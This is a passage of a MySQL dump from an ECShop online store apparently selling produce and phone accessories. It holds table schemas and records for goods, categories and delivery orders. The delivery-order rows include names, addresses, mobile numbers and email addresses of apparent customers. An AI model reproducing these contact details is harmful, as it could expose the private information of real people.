INSERT INTO `ec22703249_category` VALUES ('41', '新鲜腌制', '', '', '7', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('42', '鱼类', '', '', '8', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('43', '蟹类', '', '', '8', '50', '', '', '0', '', '1', '0', '');

-- ----------------------------
-- Table structure for `ec22703249_cat_recommend`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_cat_recommend`;
CREATE TABLE `ec22703249_cat_recommend` (
  `cat_id` smallint(5) NOT NULL,
  `recommend_type` tinyint(1) NOT NULL,
  PRIMARY KEY (`cat_id`,`recommend_type`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_cat_recommend
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_collect_goods`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_collect_goods`;
CREATE TABLE `ec22703249_collect_goods` (
  `rec_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `add_time` int(11) unsigned NOT NULL DEFAULT '0',
  `is_attention` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`rec_id`),
  KEY `user_id` (`user_id`),
  KEY `goods_id` (`goods_id`),
  KEY `is_attention` (`is_attention`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_collect_goods
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_comment`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_comment`;
CREATE TABLE `ec22703249_comment` (
  `comment_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `comment_type` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `id_value` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `email` varchar(60) NOT NULL DEFAULT '',
  `user_name` varchar(60) NOT NULL DEFAULT '',
  `content` text NOT NULL,
  `comment_rank` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `add_time` int(10) unsigned NOT NULL DEFAULT '0',
  `ip_address` varchar(15) NOT NULL DEFAULT '',
  `status` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `parent_id` int(10) unsigned NOT NULL DEFAULT '0',
  `user_id` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`comment_id`),
  KEY `parent_id` (`parent_id`),
  KEY `id_value` (`id_value`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_comment
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_crons`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_crons`;
CREATE TABLE `ec22703249_crons` (
  `cron_id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `cron_code` varchar(20) NOT NULL,
  `cron_name` varchar(120) NOT NULL,
  `cron_desc` text,
  `cron_order` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `cron_config` text NOT NULL,
  `thistime` int(10) NOT NULL DEFAULT '0',
  `nextime` int(10) NOT NULL,
  `day` tinyint(2) NOT NULL,
  `week` varchar(1) NOT NULL,
  `hour` varchar(2) NOT NULL,
  `minute` varchar(255) NOT NULL,
  `enable` tinyint(1) NOT NULL DEFAULT '1',
  `run_once` tinyint(1) NOT NULL DEFAULT '0',
  `allow_ip` varchar(100) NOT NULL DEFAULT '',
  `alow_files` varchar(255) NOT NULL,
  PRIMARY KEY (`cron_id`),
  KEY `nextime` (`nextime`),
  KEY `enable` (`enable`),
  KEY `cron_code` (`cron_code`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_crons
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_delivery_goods`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_delivery_goods`;
CREATE TABLE `ec22703249_delivery_goods` (
  `rec_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `delivery_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `product_id` mediumint(8) unsigned DEFAULT '0',
  `product_sn` varchar(60) DEFAULT NULL,
  `goods_name` varchar(120) DEFAULT NULL,
  `brand_name` varchar(60) DEFAULT NULL,
  `goods_sn` varchar(60) DEFAULT NULL,
  `is_real` tinyint(1) unsigned DEFAULT '0',
  `extension_code` varchar(30) DEFAULT NULL,
  `parent_id` mediumint(8) unsigned DEFAULT '0',
  `send_number` smallint(5) unsigned DEFAULT '0',
  `goods_attr` text,
  PRIMARY KEY (`rec_id`),
  KEY `delivery_id` (`delivery_id`,`goods_id`),
  KEY `goods_id` (`goods_id`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_delivery_goods
-- ----------------------------
INSERT INTO `ec22703249_delivery_goods` VALUES ('2', '2', '10', '0', '', '红米手机', '小米', 'ECS000010', '1', '', '0', '1', '');
INSERT INTO `ec22703249_delivery_goods` VALUES ('3', '3', '10', '0', '', '红米手机', '小米', 'ECS000010', '1', '', '0', '1', '');
INSERT INTO `ec22703249_delivery_goods` VALUES ('4', '4', '9', '0', '', '小米手机3', '小米', 'ECS000009', '1', '', '0', '1', '');
INSERT INTO `ec22703249_delivery_goods` VALUES ('5', '5', '9', '0', '', '小米手机3', '小米', 'ECS000009', '1', '', '0', '1', '');
INSERT INTO `ec22703249_delivery_goods` VALUES ('6', '6', '6', '0', '', '君禾园蚕豆', '苹果', 'ECS000006', '1', null, '0', '1', '');
INSERT INTO `ec22703249_delivery_goods` VALUES ('7', '7', '1', '0', '', '君禾园土鸡', '小米', 'ECS000000', '1', null, '0', '1', '');

-- ----------------------------
-- Table structure for `ec22703249_delivery_order`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_delivery_order`;
CREATE TABLE `ec22703249_delivery_order` (
  `delivery_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `delivery_sn` varchar(20) NOT NULL,
  `order_sn` varchar(20) NOT NULL,
  `order_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `invoice_no` varchar(50) DEFAULT NULL,
  `add_time` int(10) unsigned DEFAULT '0',
  `shipping_id` tinyint(3) unsigned DEFAULT '0',
  `shipping_name` varchar(120) DEFAULT NULL,
  `user_id` mediumint(8) unsigned DEFAULT '0',
  `action_user` varchar(30) DEFAULT NULL,
  `consignee` varchar(60) DEFAULT NULL,
  `address` varchar(250) DEFAULT NULL,
  `country` smallint(5) unsigned DEFAULT '0',
  `province` smallint(5) unsigned DEFAULT '0',
  `city` smallint(5) unsigned DEFAULT '0',
  `district` smallint(5) unsigned DEFAULT '0',
  `sign_building` varchar(120) DEFAULT NULL,
  `email` varchar(60) DEFAULT NULL,
  `zipcode` varchar(60) DEFAULT NULL,
  `tel` varchar(60) DEFAULT NULL,
  `mobile` varchar(60) DEFAULT NULL,
  `best_time` varchar(120) DEFAULT NULL,
  `postscript` varchar(255) DEFAULT NULL,
  `how_oos` varchar(120) DEFAULT NULL,
  `insure_fee` decimal(10,2) unsigned DEFAULT '0.00',
  `shipping_fee` decimal(10,2) unsigned DEFAULT '0.00',
  `update_time` int(10) unsigned DEFAULT '0',
  `suppliers_id` smallint(5) DEFAULT '0',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `agency_id` smallint(5) unsigned DEFAULT '0',
  PRIMARY KEY (`delivery_id`),
  KEY `user_id` (`user_id`),
  KEY `order_id` (`order_id`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_delivery_order
-- ----------------------------
INSERT INTO `ec22703249_delivery_order` VALUES ('2', '20140314202456278', '2014031461109', '54', '', '1394770967', '1', '上门取货', '1', 'sclzz', '刘路', '二环路西888号', '1', '2', '52', '501', '', 'asdf@asdf.com', '', '028-87760898', '13981750563', '', '', '等待所有商品备齐后再发', '0.00', '0.00', '1394771094', '0', '0', '0');
INSERT INTO `ec22703249_delivery_order` VALUES ('3', '20140314202525074', '2014031489993', '53', '', '1394770877', '1', '上门取货', '1', 'sclzz', '刘路', '北京 西城区 二环路西888号', '1', '2', '52', '501', '', 'asdf@asdf.com', '', '028-87760898', '13981750563', '', '', '等待所有商品备齐后再发', '0.00', '0.00', '1394771142', '0', '0', '0');
INSERT INTO `ec22703249_delivery_order` VALUES ('4', '20140322191646593', '2014032283144', '75', '', '1395458140', '1', '上门取货', '1', 'sclzz', '刘路', '北京 西城区 二环路西888号', '1', '2', '52', '501', '', 'asdf@asdf.com', '', '028-87760898', '13981750563', '', '', '等待所有商品备齐后再发', '0.00', '0.00', '1395458165', '0', '0', '0');
INSERT INTO `ec22703249_delivery_order` VALUES ('5', '20140425225283653', '2014042510546', '319', '768557902737', '1398408677', '2', '申通快递', '1', 'sclzz', '刘路', '北京 西城区 二环路西888号', '1', '2', '52', '501', '', 'asdf@asdf.com', '', '028-87760898', '13981750563', '', '', '等待所有商品备齐后再发', '0.00', '0.00', '1398408728', '0', '0', '0');
INSERT INTO `ec22703249_delivery_order` VALUES ('6', '20140816101938351', '2014071863125', '4', null, '1405646744', '1', '上门取货', '5', 'admin', 'CBB', 'CVMNMM,', '1', '13', '180', '1544', '', 'shi7881qiao@hotmail.com', '200123', '50201056', '13685634255', '周三', '', '等待所有商品备齐后再发', '0.00', '0.00', '1408184371', '0', '2', '0');
INSERT INTO `ec22703249_delivery_order` VALUES ('7', '20140818033859493', '2014081654691', '11', null, '1408180153', '2', '申通快递', '17', 'admin', '李大钊', 'CVMNMM,1', '1', '2', '52', '501', '', '324234@qq.com', '2001123', '', '13685634255', '周六下午', '', '', '0.00', '0.00', '1408333133', '0', '2', '0');

-- ----------------------------
-- Table structure for `ec22703249_ecyclass`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_ecyclass`;
CREATE TABLE `ec22703249_ecyclass` (
  `brand_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `brand_name` varchar(150) NOT NULL DEFAULT '',
  `brand_logo` varchar(255) NOT NULL DEFAULT '',
  `brand_desc` text NOT NULL,
  `site_url` varchar(255) NOT NULL DEFAULT '',
  `sort_order` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `porduct_id` int(11) unsigned NOT NULL DEFAULT '0',
  `pclassid` tinyint(6) unsigned NOT NULL DEFAULT '1',
  `is_show` tinyint(1) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`brand_id`),
  KEY `is_show` (`is_show`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_ecyclass
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_email_list`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_email_list`;
CREATE TABLE `ec22703249_email_list` (
  `id` mediumint(8) NOT NULL AUTO_INCREMENT,
  `email` varchar(60) NOT NULL,
  `stat` tinyint(1) NOT NULL DEFAULT '0',
  `hash` varchar(10) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_email_list
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_email_sendlist`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_email_sendlist`;
CREATE TABLE `ec22703249_email_sendlist` (
  `id` mediumint(8) NOT NULL AUTO_INCREMENT,
  `email` varchar(100) NOT NULL,
  `template_id` mediumint(8) NOT NULL,
  `email_content` text NOT NULL,
  `error` tinyint(1) NOT NULL DEFAULT '0',
  `pri` tinyint(10) NOT NULL,
  `last_send` int(10) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_email_sendlist
-- ----------------------------
INSERT INTO `ec22703249_email_sendlist` VALUES ('1', 'admin@adf.com', '6', '亲爱的test您好！\n\n恭喜您获得了1个红包，金额为￥10.00元\nECSHOP2014-04-27', '0', '1', '1398567898');

-- ----------------------------
-- Table structure for `ec22703249_error_log`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_error_log`;
CREATE TABLE `ec22703249_error_log` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `info` varchar(255) NOT NULL,
  `file` varchar(100) NOT NULL,
  `time` int(10) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `time` (`time`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_error_log
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_exchange_goods`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_exchange_goods`;
CREATE TABLE `ec22703249_exchange_goods` (
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `exchange_integral` int(10) unsigned NOT NULL DEFAULT '0',
  `is_exchange` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `is_hot` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`goods_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_exchange_goods
-- ----------------------------
INSERT INTO `ec22703249_exchange_goods` VALUES ('1', '1000', '1', '0');

-- ----------------------------
-- Table structure for `ec22703249_favourable_activity`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_favourable_activity`;
CREATE TABLE `ec22703249_favourable_activity` (
  `act_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `act_name` varchar(255) NOT NULL,
  `start_time` int(10) unsigned NOT NULL,
  `end_time` int(10) unsigned NOT NULL,
  `user_rank` varchar(255) NOT NULL,
  `act_range` tinyint(3) unsigned NOT NULL,
  `act_range_ext` varchar(255) NOT NULL,
  `min_amount` decimal(10,2) unsigned NOT NULL,
  `max_amount` decimal(10,2) unsigned NOT NULL,
  `act_type` tinyint(3) unsigned NOT NULL,
  `act_type_ext` decimal(10,2) unsigned NOT NULL,
  `gift` text NOT NULL,
  `sort_order` tinyint(3) unsigned NOT NULL DEFAULT '50',
  PRIMARY KEY (`act_id`),
  KEY `act_name` (`act_name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_favourable_activity
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_feedback`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_feedback`;
CREATE TABLE `ec22703249_feedback` (
  `msg_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `parent_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `user_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `user_name` varchar(60) NOT NULL DEFAULT '',
  `user_email` varchar(60) NOT NULL DEFAULT '',
  `msg_title` varchar(200) NOT NULL DEFAULT '',
  `msg_type` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `msg_status` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `msg_content` text NOT NULL,
  `msg_time` int(10) unsigned NOT NULL DEFAULT '0',
  `message_img` varchar(255) NOT NULL DEFAULT '0',
  `order_id` int(11) unsigned NOT NULL DEFAULT '0',
  `msg_area` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`msg_id`),
  KEY `user_id` (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_feedback
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_friend_link`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_friend_link`;
CREATE TABLE `ec22703249_friend_link` (
  `link_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `link_name` varchar(255) NOT NULL DEFAULT '',
  `link_url` varchar(255) NOT NULL DEFAULT '',
  `link_logo` varchar(255) NOT NULL DEFAULT '',
  `show_order` tinyint(3) unsigned NOT NULL DEFAULT '50',
  PRIMARY KEY (`link_id`),
  KEY `show_order` (`show_order`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_friend_link
-- ----------------------------
INSERT INTO `ec22703249_friend_link` VALUES ('1', 'ECSHOP 网上商店管理系统', 'http://www.ecshop.com/', 'http://www.ecshop.com/images/logo/ecshop_logo.gif', '50');
INSERT INTO `ec22703249_friend_link` VALUES ('2', '买否网', 'http://www.maifou.net/', '', '51');
INSERT INTO `ec22703249_friend_link` VALUES ('3', '免费开独立网店', 'http://www.wdwd.com/', '', '52');

-- ----------------------------
-- Table structure for `ec22703249_goods`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_goods`;
CREATE TABLE `ec22703249_goods` (
  `goods_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `cat_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  `goods_sn` varchar(60) NOT NULL DEFAULT '',
  `goods_name` varchar(120) NOT NULL DEFAULT '',
  `goods_name_style` varchar(60) NOT NULL DEFAULT '+',
  `click_count` int(10) unsigned NOT NULL DEFAULT '0',
  `brand_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  `provider_name` varchar(100) NOT NULL DEFAULT '',
  `goods_number` smallint(5) unsigned NOT NULL DEFAULT '0',
  `goods_weight` decimal(10,3) unsigned NOT NULL DEFAULT '0.000',
  `market_price` decimal(10,2) unsigned NOT NULL DEFAULT '0.00',
  `shop_price` decimal(10,2) unsigned NOT NULL DEFAULT '0.00',
  `promote_price` decimal(10,2) unsigned NOT NULL DEFAULT '0.00',
  `promote_start_date` int(11) unsigned NOT NULL DEFAULT '0',
  `promote_end_date` int(11) unsigned NOT NULL DEFAULT '0',
  `warn_number` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `keywords` varchar(255) NOT NULL DEFAULT '',
  `goods_brief` varchar(255) NOT NULL DEFAULT '',
  `goods_desc` text NOT NULL,
  `goods_thumb` varchar(255) NOT NULL DEFAULT '',
  `goods_img` varchar(255) NOT NULL DEFAULT '',
  `original_img` varchar(255) NOT NULL DEFAULT '',
  `is_real` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `extension_code` varchar(30) NOT NULL DEFAULT '',
  `is_on_sale` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `is_alone_sale` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `is_shipping` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `integral` int(10) unsigned NOT NULL DEFAULT '0',
  `add_time` int(10) unsigned NOT NULL DEFAULT '0',
  `sort_order` smallint(4) unsigned NOT NULL DEFAULT '100',
  `is_delete` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `is_best` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `is_new` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `is_hot` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `is_promote` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `bonus_type_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `last_update` int(10) unsigned NOT NULL DEFAULT '0',
  `goods_type` smallint(5) unsigned NOT NULL DEFAULT '0',
  `seller_note` varchar(255) NOT NULL DEFAULT '',
  `give_integral` int(11) NOT NULL DEFAULT '-1',
  `rank_integral` int(11) NOT NULL DEFAULT '-1',
  `suppliers_id` smallint(5) unsigned DEFAULT NULL,
  `is_check` tinyint(1) unsigned DEFAULT NULL,
  `riji` text,
  `ways` text,
  PRIMARY KEY (`goods_id`),
  KEY `goods_sn` (`goods_sn`),
  KEY `cat_id` (`cat_id`),
  KEY `last_update` (`last_update`),
  KEY `brand_id` (`brand_id`),
  KEY `goods_weight` (`goods_weight`),
  KEY `promote_end_date` (`promote_end_date`),
  KEY `promote_start_date` (`promote_start_date`),
  KEY `goods_number` (`goods_number`),
  KEY `sort_order` (`sort_order`)
) ENGINE=MyISAM AUTO_INCREMENT=26 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_goods
-- ----------------------------
INSERT INTO `ec22703249_goods` VALUES ('1', '10', 'ECS000000', '君禾园土鸡', '+', '151', '1', '', '100', '0.000', '58.80', '49.00', '40.00', '1380988800', '1478275200', '1', '', '', 'w3', 'images/201310/thumb_img/1_thumb_G_1381080926818.jpg', 'images/201310/goods_img/1_G_1381080926401.jpg', 'images/201310/source_img/1_G_1381080926338.jpg', '1', '', '1', '1', '0', '0', '1381080926', '100', '0', '1', '1', '0', '1', '0', '1408184220', '0', '', '-1', '-1', '0', '0', 'werewr', 'aaaa');
INSERT INTO `ec22703249_goods` VALUES ('2', '10', 'ECS000002', '君禾园苦瓜', '+', '73', '1', '', '100', '0.000', '36.00', '30.00', '28.00', '1381046400', '1478332800', '1', '', '', '', 'images/201310/thumb_img/2_thumb_G_1381081006658.jpg', 'images/201310/goods_img/2_G_1381081006155.jpg', 'images/201310/source_img/2_G_1381081006740.jpg', '1', '', '1', '1', '0', '0', '1381081006', '100', '0', '1', '1', '1', '1', '0', '1404697694', '0', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('3', '10', 'ECS000003', '小米超薄5055mAh移动电源（白）adios', '+', '12', '0', '', '100', '0.000', '154.79', '129.00', '0.00', '0', '0', '1', '', '28纳米四核1.5GHz 4.7英寸IPS视网膜屏', '', 'images/201404/thumb_img/3_thumb_G_1398450814920.jpg', 'images/201404/goods_img/3_G_1398450814102.jpg', 'images/201404/source_img/3_G_1398450814906.jpg', '1', '', '1', '1', '0', '1', '1381081063', '100', '0', '0', '0', '0', '0', '0', '1398450906', '0', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('4', '10', 'ECS000004', '鳄鱼纹真皮后盖（豹纹黄）adi', '+', '33', '1', '', '100', '0.000', '118.80', '99.00', '0.00', '0', '0', '1', '', '', '', 'images/201310/thumb_img/4_thumb_G_1381081094117.jpg', 'images/201310/goods_img/4_G_1381081094237.jpg', 'images/201310/source_img/4_G_1381081094291.jpg', '1', '', '1', '1', '0', '0', '1381081094', '100', '0', '1', '1', '1', '0', '0', '1396223970', '0', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('5', '10', 'ECS000005', '冰淇淋色后盖（黄）-非', '+', '33', '1', '', '100', '0.000', '58.80', '49.00', '0.00', '0', '0', '1', '', '', '', 'images/201310/thumb_img/5_thumb_G_1381081130578.jpg', 'images/201310/goods_img/5_G_1381081130476.jpg', 'images/201310/source_img/5_G_1381081130081.jpg', '1', '', '1', '1', '0', '0', '1381081130', '100', '0', '1', '1', '1', '0', '0', '1393541958', '0', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('6', '10', 'ECS000006', '君禾园蚕豆', '+', '76', '3', '', '100', '0.000', '21.59', '18.00', '0.00', '0', '0', '1', '', '', '', 'images/201310/thumb_img/6_thumb_G_1381081160153.jpg', 'images/201310/goods_img/6_G_1381081160462.jpg', 'images/201310/source_img/6_G_1381081160257.jpg', '1', '', '1', '1', '0', '0', '1381081160', '100', '0', '1', '1', '1', '0', '0', '1404697670', '0', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('7', '11', 'ECS000007', '小米定制版拉卡拉刷卡器', '+', '22', '1', '', '100', '0.000', '105.60', '88.00', '0.00', '0', '0', '1', '', '', '', 'images/201310/thumb_img/7_thumb_G_1381081297850.jpg', 'images/201310/goods_img/7_G_1381081297686.jpg', 'images/201310/source_img/7_G_1381081297677.jpg', '1', '', '1', '1', '0', '0', '1381081297', '100', '0', '1', '1', '1', '0', '0', '1393541949', '1', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('8', '11', 'ECS000008', '学院风帆布双肩包（黑）', '+', '108', '1', '', '100', '0.000', '70.80', '59.00', '0.00', '0', '0', '1', '', '高清网络机顶盒，发烧升级，性能提升4倍', '', 'images/201310/thumb_img/8_thumb_G_1381081330475.jpg', 'images/201310/goods_img/8_G_1381081330963.jpg', 'images/201310/source_img/8_G_1381081330468.jpg', '1', '', '1', '1', '0', '0', '1381081330', '101', '0', '1', '1', '1', '0', '0', '1393541946', '1', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('9', '1', 'ECS000009', '君禾园红萝卜', '+', '82', '1', '', '110', '0.000', '0.01', '0.01', '0.00', '0', '0', '1', '', '迄今为止最快的小米手机', '<h1>快，就是速度超越所有其它</h1>\r\n<p>小米手机3 安兔兔性能测试对比表。得分越高，代表综合性能越强。<br />\r\n内置72颗 NVIDIA GeForce 图形处理核芯</p>\r\n<h1><strong>全面支持最新3D游戏特效</strong></h1>\r\n<p>小米手机3 图形处理核芯由72颗 NVIDIA GeForce GPU 核芯组成，每秒可运行1150亿次浮点运算！<br />\r\n支持DirectX 9、PhysX 等多种图形技术与最新的3D游戏动态效果。</p>\r\n<h1>迄今速度最快</h1>\r\n<p>2GB LPDDR3 内存<br />\r\n顶级 LPDDR3 内存，较LPDDR2提升50%，同时功耗降低20%！<br />\r\n顶级 16GB/64GB eMMC 4.5 闪存，读速度高达 120MB/s。</p>\r\n<h1>夏普/LG 5吋超灵敏触控视网膜屏</h1>\r\n<p>标准16:9全高清分辨率，显示精度高达441PPI<br />\r\n5吋大屏，游戏、视频、阅读一切截然不同！全高清视网膜屏，1920 x 1080全高清分辨率提供标准16:9的完美兼容方案，<br />\r\n显示精度比小米手机2S提高 28%，更细腻、更自然。搭载康宁玻璃，使用超灵敏触摸屏，湿手或戴手套也能操作。<br />\r\n<br />\r\n&nbsp;</p>', 'images/201402/thumb_img/9_thumb_G_1393521367610.jpg', 'images/201402/goods_img/9_G_1393521367739.jpg', 'images/201402/source_img/9_G_1393521367780.jpg', '1', '', '1', '1', '1', '0', '1393470766', '2', '0', '1', '1', '1', '0', '0', '1404697563', '4', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('10', '12', 'ECS000010', '舌尖上的佳肴', '+', '227', '1', '', '4000', '0.000', '838.80', '699.00', '0.00', '0', '0', '1', '2008年01月 1600万 320×240 像素 800万 黑色 灰色 银色 粉色 白色 蓝色 金色 双模（GSM,900,1800,CDMA 1X） 滑盖', 'MTK联发科最强28纳米四核1.5GHz', '<h2><strong>电话，短信</strong></h2>\r\n<p>利用拨号盘快速查找联系人，通话时显示全屏来电大头贴，来电提示归属地及骚扰号码，响一声电话自动静音，远离来电骚扰，尽享自然通话。</p>\r\n<p>&nbsp;</p>\r\n<h2><strong>更安全的MIUI米柚操作系统</strong></h2>\r\n<p>系统级整合金山、瓦力、LBE等专业安全技术，更完善的安全机制，操作系统从未如此安全。</p>\r\n<p>&nbsp;</p>\r\n<p>&nbsp;</p>\r\n<h2><strong>你的手机与众不同</strong></h2>\r\n<p>独创个性主题、百变锁屏与自由桌面MIUI拥有上千款个性主题，上万种个性搭配。 你可以在线访问主题商店，随时获取由上千名知名设计师为你精心设计的个性主题。</p>', 'images/201402/thumb_img/10_thumb_G_1393522126376.jpg', 'images/201402/goods_img/10_G_1393522126693.jpg', 'images/201402/source_img/10_G_1393522126032.jpg', '1', '', '1', '1', '0', '6', '1393522126', '1', '0', '1', '1', '1', '0', '0', '1404697518', '9', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('11', '1', 'ECS000011', '君禾园蔬菜篮', '+', '31', '1', '', '1000', '0.000', '1558.80', '1299.00', '0.00', '0', '0', '1', '', '挑战4核性价比极限', '<p>\r\n	0724测试\r\n</p>', 'images/201402/thumb_img/11_thumb_G_1393531608375.jpg', 'images/201402/goods_img/11_G_1393531608505.jpg', 'images/201402/source_img/11_G_1393531608939.jpg', '1', '', '1', '1', '0', '12', '1393531608', '2', '0', '1', '1', '1', '0', '0', '1406140194', '0', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('21', '9', 'ESC000017', '体验卡', '+', '3', '0', '', '80', '0.000', '0.00', '800.00', '0.00', '0', '0', '1', '', '', '<p>\r\n	800元体验卡<br />\r\n配送有效期：2个半月     <br />\r\n积点数800 <br />\r\n适合家庭：2-3人<br />\r\n热销价：800元 <br />\r\n套餐介绍 \r\n</p>\r\n<p>\r\n	<br />\r\n君禾园是以上海市个人家庭为主要服务对象，由于自然生态种植是建立在有限规模基础上的生产方式。因此，我们设定只服务于600家会员客户。依据个人家庭每周的蔬果消费状况，确定会员卡种类、配送期限及方式。如付款完成，您会收到一张会员储值卡，卡上有您的会员号和初始密码，您可凭此登录我司网站及您的账户；并在你的账户内选购产品；依据您购买的金额，查询您账户内相应的积点数。 我们的产品以点数计价，产品单价公示于网站上。\r\n</p>\r\n<p>\r\n	<br />\r\n特别提醒： 如超过此卡的有效期及相应的延长期限，卡内的金额将被冻结，这是由于当您购买了会员卡，我们就必须按约定的正常需求量进行生产，且农产品的特殊性造成其无法长期存放和再利用，这些都将产生资源浪费，请您谅解。我们会将扣除了实际的生产成本及相关服务费用后的余额退还给您。\r\n</p>', 'images/201407/thumb_img/21_thumb_G_1406222666164.jpg', 'images/201407/goods_img/21_G_1406222666141.jpg', 'images/201407/source_img/21_G_1406222666607.jpg', '0', 'virtual_card', '1', '1', '0', '0', '1406222666', '100', '0', '0', '0', '1', '0', '0', '1406236535', '0', '', '800', '0', '0', '0', null, null);
